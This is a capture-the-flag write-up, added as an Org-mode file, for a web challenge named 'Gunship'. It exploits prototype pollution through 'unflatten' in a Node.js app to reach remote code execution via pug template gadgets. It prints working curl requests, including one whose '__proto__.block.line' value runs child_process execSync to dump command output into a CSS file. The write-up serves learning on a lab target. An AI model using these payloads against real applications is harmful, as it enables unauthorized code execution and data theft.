@@ -1,0 +1,144 @@
+:PROPERTIES:
+:ID:       0b30c43e-f6c7-4399-ae95-a583332112ef
+:END:
+#+TITLE: Gunship
+#+AUTHOR: AsmArtisan256
+#+DATE: 05-01-2025
+
+#+OPTIONS: html-style:nil
+#+OPTIONS: html-scripts:nil
+
+#+OPTIONS: author:nil
+#+OPTIONS: email:nil
+#+OPTIONS: date:t
+#+OPTIONS: toc:nil
+
+#+PROPERTY: header-args :eval no
+
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>
+
+#+EXPORT_FILE_NAME: gunship
+
+Once again, a challenge where the website accepts user input. You have to
+introduce your favorite artist's name. Right at the start, it's possible to see
+that you just can't introduce *any* name:
+
+
+#+DOWNLOADED: screenshot @ 2025-01-05 10:44:28
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-05_10-44-28_screenshot.png]]
+
+Unless you introduce the name of one of the two artists that are part of the
+aforementioned band called =Gunship=:
+
+
+#+DOWNLOADED: screenshot @ 2025-01-05 10:45:58
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-05_10-45-58_screenshot.png]]
+
+If you download the files, you can see the logic related to this in
+=routes/index.js=, where there are three valid names: =Haigh=, =Westaway= and =Gingell=.
+I don't even know where =Gingell= comes from:
+
+#+BEGIN_SRC js
+router.post('/api/submit', (req, res) => {
+    const { artist } = unflatten(req.body);
+
+    if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
+        return res.json({
+            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
+        });
+    } else {
+        return res.json({
+            'response': 'Please provide us with the full name of an existing member.'
+        });
+    }
+});
+#+END_SRC
+
+Right from the get go, this web app uses a template engine called =pugjs=, but
+doesn't seem really that exploitable, since it's just HTML. What's interesting
+here is =unflatten=, which can be exploited because of [[https://swisskyrepo.github.io/PayloadsAllTheThings/Prototype%20Pollution/][Prototype Pollution]]. That
+means I can just manipulate the =json= data sent in the =POST= request and get
+results. Here is an example of a simple request when submitting the name:
+
+#+BEGIN_SRC sh :results output
+curl 'http://94.237.50.242:46641/api/submit'\
+     -X POST \
+     -H 'Content-Type: application/json' \
+     --data-raw '{"artist.name":"Gingell"}'
+#+END_SRC
+
+#+BEGIN_SRC js
+{"response":"<span>Hello guest, thank you for letting us know!</span>"}
+#+END_SRC
+
+If I add ="___proto___.json spaces": " "= to the =json= data that is sent, we can see
+that the setting was applied, by looking at the spaces that were added to the
+=json= result:
+
+#+BEGIN_SRC sh :results output
+curl 'http://94.237.50.242:46641/api/submit'\
+     -X POST \
+     -H 'Content-Type: application/json' \
+     --data-raw '{"artist.name":"Gingell", "__proto__.json spaces": " "}'
+#+END_SRC
+
+#+BEGIN_SRC js
+{
+    "response": "<span>Hello guest, thank you for letting us know!</span>"
+}
+#+END_SRC
+
+The =pugjs= GitHub repository has an interesting [[https://github.com/pugjs/pug/issues/3414][issue]] with some useful gadgets
+for =Remote Code Execution=! Since they are all being done on
+=Object.prototype.xxx=, that means we can manipulate the =json= that is being sent
+to do the same. Let's start with executing a =ls -la= command to show the contents
+of the directory and, since we know the output won't be in the request result,
+let's just redirect it to the =css= file of the web application:
+
+#+BEGIN_SRC sh :results output
+curl 'http://94.237.50.242:46641/api/submit'\
+     -X POST \
+     -H 'Content-Type: application/json' \
+     --data-raw '{"artist.name":"Gingell", "__proto__.block.type": "Text", "__proto__.block.line": "process.mainModule.require(\"child_process\").execSync(\"ls -la >> static/css/main.css\")" }'
+#+END_SRC
+
+And the results are in:
+
+
+#+DOWNLOADED: screenshot @ 2025-01-05 11:05:24
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-05_11-05-24_screenshot.png]]
+
+Since we appended to the =css= file, it goes to the end of it. As the image shows,
+we got the result of the =ls -la= command and we can see the flag is in the same
+directory. Therefore to get the flag, we just execute =cat flag= and redirect it
+to the same file!
+
+
+* FOOTER                                                                                              :ignore:
+:PROPERTIES:
+:clearpage: t
+:END:
+#+BEGIN_EXPORT html
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">05-01-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+#+END_EXPORT
